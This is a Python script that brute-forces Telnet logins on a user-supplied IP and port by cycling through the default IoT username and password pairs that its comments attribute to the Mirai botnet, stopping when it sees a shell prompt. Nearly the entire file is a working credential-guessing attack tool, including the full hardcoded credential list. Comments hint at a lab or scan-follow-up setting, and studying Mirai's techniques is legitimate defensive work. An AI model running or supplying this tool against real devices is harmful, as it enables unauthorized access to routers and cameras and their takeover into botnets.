import telnetlib
import time
import sys


# Assuming 'target_device' is obtained from your previous TCP SYN scan
# Right now, this IP has to be hardcoded
#target_device = '192.168.237.128'
# Hardedcoded only for telnet as 23. We have to change for 2323
#port = 23  # Default Telnet port

def main():
    # Prompt user for target device IP or hostname
    target_device_ip = input("Enter the target device IP: ")
    
    # Prompt user for port number
    port = input("Enter the port number: ")
    
    try:
        # Convert port to an integer
        port = int(port)
    except ValueError:
        print("Error: Port must be a number.")
        sys.exit(1)

    # Actual list of tuples with username and password used by MIRAI
    credentials = [
        ("root", "xc3511"),
        ("root", "vizxv"),
        ("root", "admin"),
        ("admin", "admin"),
        ("root", "888888"),
        ("root", "xmhdipc"),
        ("root", "default"),
        ("root", "juantech"),
        ("root", "123456"),
        ("root", "54321"),
        ("support", "support"),
        ("root", ""),
        ("admin", "password"),
        ("root", "root"),
        ("root", "12345"),
        ("user", "user"),
        ("admin", ""),
        ("root", "pass"),
        ("admin", "admin1234"),
        ("root", "1111"),
        ("admin", "smcadmin"),
        ("admin", "1111"),
        ("root", "666666"),
        ("root", "password"),
        ("root", "1234"),
        ("root", "klv123"),
        ("Administrator", "admin"),
        ("service", "service"),
        ("supervisor", "supervisor"),
        ("guest", "guest"),
        ("guest", "12345"),
        ("guest", "12345"),
        ("admin1", "password"),
        ("administrator", "1234"),
        ("666666", "666666"),
        ("888888", "888888"),
        ("ubnt", "ubnt"),
        ("root", "klv1234"),
        ("root", "Zte521"),
        ("root", "hi3518"),
        ("root", "jvbzd"),
        ("root", "anko"),
        ("root", "zlxx."),
        ("root", "7ujMko0vizxv"),
        ("root", "7ujMko0admin"),
        ("root", "system"),
        ("root", "ikwb"),
        ("root", "dreambox"),
        ("root", "user"),
        ("root", "realtek"),
        ("root", "00000000"),
        ("admin", "1111111"),
        ("admin", "1234"),
        ("admin", "12345"),
        ("admin", "54321"),
        ("admin", "123456"),
        ("admin", "7ujMko0admin"),
        ("admin", "1234"),
        ("admin", "pass"),
        ("admin", "meinsm"),
        ("tech", "tech"),
        ("mother", "fucker")
    ]

    for username, password in credentials:
        try:
            print(f"Trying {username}:{password}")

            # Establish a Telnet connection
            tn = telnetlib.Telnet(target_device_ip, port, timeout=10)
            
            # Read until a login prompt is found (customize as needed)
            tn.read_until(b"login: ")
            tn.write(username.encode('ascii') + b"\n")

            # Assuming a password will be prompted next; adjust if your target system behaves differently
            if password:
                tn.read_until(b"Password: ")
                tn.write(password.encode('ascii') + b"\n")

            # Wait for a command prompt or other successful login indicator
            # This part is highly specific to the target system and may need adjustment
            index, match, text = tn.expect([b"Last login", b"\$ ", b"# "], timeout=5)
            if index != -1:
                print(f"Success: {username}:{password}")
                tn.close()
                break  # Exit after the first successful login
            else:
                print(f"Failed: {username}:{password}")
            tn.close()
        except Exception as e:
            print(f"Connection failed for {username}:{password} with error {e}")
        finally:
            time.sleep(1)  # Be polite and don't overwhelm the network/device

if __name__ == "__main__":
    main()